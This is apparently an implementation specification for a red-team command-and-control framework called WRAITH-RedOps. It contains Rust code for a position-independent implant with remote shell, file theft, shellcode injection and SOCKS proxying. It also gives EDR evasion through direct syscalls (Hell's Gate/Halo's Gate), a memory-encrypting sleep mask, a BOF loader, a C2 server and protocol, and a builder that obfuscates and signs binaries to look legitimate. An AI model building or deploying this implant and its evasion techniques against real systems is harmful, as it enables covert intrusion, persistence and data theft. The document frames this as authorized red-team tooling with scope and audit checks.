# WRAITH-RedOps Implementation Details

**Document Version:** 1.6.0 (Maximum Specification)
**Last Updated:** 2025-11-29

---

## 1. Spectre Implant Internals (Rust `no_std`)

### 1.1 Design Philosophy & Entry Point
The implant is designed as a position-independent blob (PIC). It must run without the operating system's loader or standard library.

**Core Requirements:**
*   **`no_std`:** No dependency on `libc` or `msvcrt`.
*   **Panic Handling:** Custom panic handler that silently terminates or logs to a ring buffer (feature flagged).
*   **Entry Point:** Custom assembly stub to align stack and save registers.

```rust
// src/implant/main.rs
#![no_std]
#![no_main]

use wraith_core::session::{Session, SessionConfig};
use wraith_transport::udp::UdpTransport;

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    // Silent termination in production to avoid crashing host process
    loop {}
}

#[no_mangle]
pub extern "C" fn main() -> ! {
    // 1. Initialize obfuscation (sleep mask context)
    obfuscation::init();

    // 2. Resolve APIs dynamically (to hide imports)
    // Uses DJB2 hash of function names to find addresses in PEB -> Ldr -> InLoadOrderModuleList
    let transport_api = winapi::resolve_networking();

    // 3. Connect to Team Server via WRAITH
    // Configuration is patched into the .data section by the Builder
    let config = SessionConfig::default(); 
    let transport = UdpTransport::new(config.c2_address);
    
    // 4. Handshake & Session Establishment (Noise_XX)
    let mut session = Session::connect(transport, config.keys).unwrap();

    // 5. Event Loop
    loop {
        // Poll for encrypted C2 packets
        if let Some(packet) = session.poll() {
            match packet.type {
                Cmd::Shell(cmd) => execution::run_shell(cmd),
                Cmd::Upload(file) => fs::write_file(file),
                Cmd::Download(path) => fs::read_file(path),
                Cmd::ExecuteBOF(bof) => execution::loader::run_coff(bof),
                Cmd::Inject(pid, shellcode) => injection::inject_remote(pid, shellcode),
                Cmd::SocksData(id, data) => proxy::handle_socks(id, data),
                Cmd::Exit => break,
            }
        }
        
        // Obfuscate memory and sleep
        // This triggers the ROP chain to encrypt .text/.data and call NtWaitForSingleObject
        obfuscation::sleep(config.sleep_interval, config.jitter);
    }
    
    session.close();
}
```

### 1.2 Syscall Strategy (Hell's Gate / Halo's Gate)
To evade EDR hooks, we do not call `OpenProcess` in `kernel32.dll`. Instead, we invoke the kernel syscall directly.

1.  **Read ntdll.dll:** Parse the export table of the disk-backed `ntdll.dll` or the in-memory one (carefully, checking for hooks/jmp instructions).
2.  **Find Syscall Number:** Extract the SSN (System Service Number) for critical functions like `NtOpenProcess`, `NtAllocateVirtualMemory`.
3.  **Halo's Gate Fallback:** If the function is hooked (starts with `jmp`), scan neighbors to calculate the correct SSN.
4.  **Execute:** Use the `syscall` instruction in assembly.

```rust
// Pseudocode for Syscall Stub
#[naked]
unsafe extern "C" fn syscall_stub(ssn: u32, ...) {
    asm!(
        "mov r10, rcx",      // Save RCX (Argument 1) to R10 for syscall convention
        "mov eax, {ssn}",    // Load Syscall Number
        "syscall",           // Transition to Kernel Mode
        "ret",
        ssn = in(reg) ssn,
    );
}
```

### 1.3 Sleep Mask Implementation (x64 Assembly)
The Sleep Mask is a critical evasion feature. It encrypts the implant's memory while waiting for the next check-in.

**Concept:**
1.  Create a ROP chain (Return-Oriented Programming) or a standalone shellcode stub copied to a non-executable page (temporarily made RWX or using ROP to change permissions).
2.  XOR Encrypt the `.text` (code) and `.data` sections of the beacon.
3.  Call `NtWaitForSingleObject`.
4.  XOR Decrypt upon return.

**Assembly Stub Logic:**
```asm
; rbx = base address, rcx = size, rdx = key
encrypt_loop:
    xor byte ptr [rbx], dl
    rol rdx, 8
    inc rbx
    loop encrypt_loop
    
    ; Call Sleep via Syscall
    sub rsp, 32
    call rax ; NtWaitForSingleObject
    add rsp, 32
    
    ; Decrypt (Run loop again in reverse or separate block)
    ; ...
```

### 1.4 BOF Loader (COFF Execution)
The implant can load and execute Cobalt Strike-compatible Beacon Object Files (BOFs).

**Loader Logic:**
1.  **Parse Header:** Read standard COFF header.
2.  **Allocate Memory:** Allocate RWX memory for the BOF code sections.
3.  **Relocations:** Process `.reloc` section to fix up addresses based on where the code was loaded in memory.
4.  **Symbol Resolution:**
    *   Resolve internal functions provided by Spectre API (`BeaconPrintf`, `BeaconVirtualAlloc`, `BeaconDataInt`).
    *   Resolve external imports (`kernel32$VirtualAlloc`, `msvcrt$memcpy`).
5.  **Execute:** Jump to the entry point.
6.  **Cleanup:** Capture stdout/stderr output and free memory.

---

## 2. Team Server Architecture

### 2.1 Listener Architecture (Tokio Actors)
The Team Server uses an actor model where each Listener is an isolated task managed by a Supervisor.

```rust
// src/server/listener.rs

use wraith_core::server::Server;

pub struct C2Listener {
    server: Server, // Underlying WRAITH transport server
    db_pool: PgPool,
    config: ListenerConfig,
}

impl C2Listener {
    pub async fn run(&self) {
        // Accept loop
        while let Some(mut session) = self.server.accept().await {
            let db = self.db_pool.clone();
            // Spawn a handler task for this specific implant session
            tokio::spawn(async move {
                handle_implant_session(session, db).await;
            });
        }
    }
}

async fn handle_implant_session(mut session: Session, db: PgPool) {
    // 1. Perform Noise_XX Handshake
    // This establishes a mutually authenticated, encrypted tunnel
    let agent_id = session.handshake().await.unwrap();
    
    // 2. Update Last Seen
    sqlx::query!("UPDATE beacons SET last_seen = NOW(), status = 'ALIVE' WHERE id = $1", agent_id)
        .execute(&db).await.unwrap();
        
    // 3. Check for Pending Tasks
    let tasks = fetch_pending_tasks(&db, agent_id).await;
    for task in tasks {
        session.send(task).await;
    }
    
    // 4. Process Results
    while let Some(result) = session.recv().await {
        store_result(&db, result).await;
    }
}
```

### 2.2 Database Schema (PostgreSQL)
Complete schema for state management.

```sql
-- Listeners Configuration
CREATE TABLE listeners (
    id SERIAL PRIMARY KEY,
    name VARCHAR(64) UNIQUE NOT NULL,
    type VARCHAR(16) NOT NULL, -- UDP, HTTP, SMB
    bind_address INET NOT NULL,
    config JSONB NOT NULL, -- Stores Port, SSL Certs, Profile
    status VARCHAR(16) DEFAULT 'ACTIVE'
);

-- Active Beacons
CREATE TABLE beacons (
    id TEXT PRIMARY KEY, -- Derived from Public Key Hash
    internal_ip INET,
    external_ip INET,
    hostname VARCHAR(255),
    user_name VARCHAR(255),
    process_id INT,
    os_arch VARCHAR(8), -- x64, x86
    os_version VARCHAR(64),
    linked_beacon_id TEXT REFERENCES beacons(id), -- Parent for P2P chaining
    last_seen TIMESTAMP WITH TIME ZONE,
    status VARCHAR(16), -- ALIVE, DEAD, EXITING
    encryption_key BYTEA -- Session Key
);

-- Task Queue
CREATE TABLE tasks (
    id SERIAL PRIMARY KEY,
    beacon_id TEXT REFERENCES beacons(id),
    command_type INT NOT NULL,
    arguments BYTEA, -- Serialized Protobuf Args
    queued_at TIMESTAMP DEFAULT NOW(),
    sent_at TIMESTAMP,
    completed_at TIMESTAMP,
    result_output BYTEA, -- Encrypted or Cleartext output
    operator_id INT REFERENCES users(id),
    context JSONB -- Arbitrary metadata (e.g. "Automated Survey")
);

-- Artifacts/Files
CREATE TABLE downloads (
    id SERIAL PRIMARY KEY,
    beacon_id TEXT REFERENCES beacons(id),
    file_path TEXT,
    file_size BIGINT,
    data BYTEA,
    created_at TIMESTAMP DEFAULT NOW()
);

-- Audit Logs
CREATE TABLE audit_logs (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT NOW(),
    user_id INT,
    action TEXT,
    details JSONB
);
```

---

## 3. C2 Protocol Details

### 3.1 Transport Layer
*   **Encryption:** WRAITH handles transport encryption (Noise_XX).
*   **Authentication:** Mutual authentication preventing rogue server attacks and rogue implant connection attempts.

### 3.2 Application Layer (RedOps Protocol)
Encapsulated *inside* WRAITH frames. This is the layout of the decrypted payload.

**Packet Structure (Byte Layout):**
```
[ Header (4B) ] [ Task ID (4B) ] [ Command Type (2B) ] [ Length (4B) ] [ Payload (Var) ]
```

*   **Header:** `0xDEADBEEF` (Magic bytes identifying protocol version).
*   **Task ID:** Correlates requests with asynchronous responses. A Random u32.
*   **Command Type:** Maps to the Enum (see 3.3).
*   **Length:** Length of the Payload field.
*   **Payload:** Raw bytes or Protobuf depending on opcode.

### 3.3 Protocol Data Unit (PDU) Definitions (Protobuf)
For complex commands, the Payload field contains a serialized Protobuf message.

```protobuf
syntax = "proto3";

message BeaconTask {
    uint32 task_id = 1;
    CommandType command = 2;
    bytes arguments = 3; // Serialized args specific to command
}

enum CommandType {
    SLEEP = 0;
    SHELL = 1;
    UPLOAD = 2;
    DOWNLOAD = 3;
    EXECUTE_BOF = 4;
    INJECT = 5;
    SOCKS_DATA = 6;
    EXIT = 99;
}

message BeaconResponse {
    uint32 task_id = 1;
    uint32 status_code = 2; // 0 = Success, 1 = Error
    bytes output = 3;
    string error_msg = 4;
}
```

---

## 4. Builder Pipeline (Artifact Generation)

### 4.1 Dynamic Compilation
The Team Server generates unique binaries for each campaign to evade static signatures.

**Pipeline Steps:**
1.  **Template Selection:** Select pre-compiled `.rlib` (Rust Library) of the implant core based on target OS/Arch (e.g., `spectre_core_windows_x64.rlib`).
2.  **Config Generation:** Server generates a ephemeral `config.rs` source file containing the C2 domain, public key, jitter parameters, and expiry date.
3.  **Linking:** Uses `lld` (LLVM Linker) via API or CLI to link the core rlib + config + platform stubs into a final PE/ELF executable.
4.  **Obfuscation:** Runs post-processing passes (LLVM-Obfuscator) to:
    *   Randomize instruction sequences.
    *   Flatten control flow graphs.
    *   Encrypt string literals.
5.  **Signing:** Signs the binary with a configured Authenticode certificate to look legitimate.

---

## 5. Automation & Scripting Bridge

### 5.1 Scripting API
The Team Server exposes a Lua (or Python) bridge to allow "Aggressor Scripts" to automate tasks.

**Example Lua Script:**
```lua
-- on_beacon_initial: Called when a new beacon checks in
function on_beacon_initial(beacon)
    println("New Beacon: " .. beacon.hostname .. "@" .. beacon.internal_ip)
    
    -- Auto-Survey
    task_shell(beacon.id, "whoami /all")
    task_shell(beacon.id, "net start")
    
    -- Check if we are in a sandbox
    if beacon.user_name == "WDAGUtilityAccount" then
        task_exit(beacon.id)
    end
end
```

---

## 6. "Ghost Replay" Mechanism

### 6.1 Concept
Allows operators to replay a sequence of TTPs exactly as they occurred in a previous engagement for training or verification.

**Implementation:**
1.  **Recording:** All `tasks` entries are timestamped relative to the `campaign_start`.
2.  **Export:** `wraith-redops export-campaign --id 123 --out replay.json`.
3.  **Replay Engine:**
    *   Spawns a "Mock Agent" or waits for real agents.
    *   Injects tasks into the queue matching the relative timestamps of the original campaign.
    *   Verifies that the output matches the expected output (if deterministic).

---

## 7. Governance Enforcement

Strict checks before task queuing to ensure safety.

```rust
// src/server/governance.rs

impl TaskQueue {
    pub fn queue_task(&self, task: Task, user: User) -> Result<(), Error> {
        // 1. Check Scope (Hard Block)
        if !self.scope.is_allowed(&task.target_ip) {
             return Err(Error::ScopeViolation);
        }

        // 2. Check Authorization (RBAC)
        if task.is_high_risk() && !user.is_admin {
            return Err(Error::AuthorizationFailed("High risk task requires admin"));
        }

        // 3. Check Time (Engagement Window)
        if Utc::now() > self.engagement_end_date {
             return Err(Error::EngagementExpired);
        }

        // 4. Log Audit (Immutable)
        self.audit_log.record(user, task);

        // 5. Queue
        self.db.insert_task(task);
        Ok(())
    }
}
```
